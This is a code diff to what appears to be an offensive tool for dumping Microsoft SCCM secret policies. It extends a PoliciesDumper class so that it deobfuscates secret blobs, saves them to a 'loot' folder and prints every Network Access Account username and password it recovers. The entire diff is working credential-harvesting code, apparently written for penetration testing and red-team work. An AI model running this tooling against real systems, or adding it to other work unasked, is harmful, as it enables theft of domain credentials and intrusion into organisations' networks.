@@ -1,7 +1,9 @@
 import os
 import zlib
 import json
+import string
 import base64
+import random
 import logging
 import requests
 import binascii
@@ -263,10 +265,11 @@ class PoliciesDumper():
             try:
                 result = self.process_secret_policy(key, value)
                 if result is not None:
-                    if len(result[0].strip('\x00')) == 0 and len(result[1].strip('\x00')) == 0:
-                        logger.warning(f"[-] NAA policy parsed, but no NAA account seem to be configured as credentials are empty ('{result[0]}:{result[1]}')")
-                    else:
-                        logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result[0]}:{result[1]}'{bcolors.ENDC}")
+                    for NAA_username, NAA_password in zip(result[0], result[1]):
+                        if len(NAA_username.strip('\x00')) == 0 and len(NAA_password.strip('\x00')) == 0:
+                            logger.warning(f"[-] NAA policy parsed, but no NAA account seem to be configured as credentials are empty ('{NAA_username}:{NAA_password}')")
+                        else:
+                            logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{NAA_username}:{NAA_password}'{bcolors.ENDC}")
             except Exception as e:
                 logger.info("", exc_info=True)
                 logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy {key}{bcolors.ENDC}")
@@ -297,8 +300,8 @@ class PoliciesDumper():
         os.makedirs(f'loot/{self.output_dir}/policies/{policyID}')
 
 
-        NAA_username = None
-        NAA_password = None
+        NAA_usernames = []
+        NAA_passwords = []
         policy_response = self.request_policy(policy["PolicyLocation"])
 
         if self.use_https is True:
@@ -342,19 +345,20 @@ class PoliciesDumper():
         else:
             obfuscated_blobs = root.findall('.//*[@secret="1"]')    
             for obfuscated_blob in obfuscated_blobs:       
-                blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text
+                blobs_set[obfuscated_blob.attrib["name"] + ''.join(random.choices(string.ascii_letters + string.digits, k=8))] = obfuscated_blob[0].text
         
         logger.warning(f"[*] Found {bcolors.BOLD}{len(blobs_set.keys())}{bcolors.ENDC} obfuscated blob(s) in secret policy.")
-        for i, blob_name in enumerate(blobs_set.keys()):
-            data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
+        for i, unique_blob_name in enumerate(blobs_set.keys()):
+            blob_name = unique_blob_name[:-8]
+            data = deobfuscate_secret_policy_blob(blobs_set[unique_blob_name])
             filename = f'loot/{self.output_dir}/policies/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
             with open(filename, 'w') as f:
                 f.write(f"Secret property name: {blob_name}\n\n")
                 f.write(data + "\n")
             if blob_name == "NetworkAccessUsername":
-                NAA_username = data
+                NAA_usernames.append(data)
             if blob_name == "NetworkAccessPassword":
-                NAA_password = data
+                NAA_passwords.append(data)
 
             logger.info(f"[INFO] Deobfuscated blob n°{i+1}")
             try:
@@ -371,7 +375,7 @@ class PoliciesDumper():
                 logger.info("[INFO] Failed parsing XML on this blob - not XML content (expected)")
                 pass
         
-        if NAA_username is not None or NAA_password is not None:
-            return (NAA_username, NAA_password)
+        if len(NAA_usernames) > 0:
+            return (NAA_usernames, NAA_passwords)
         else:
             return None
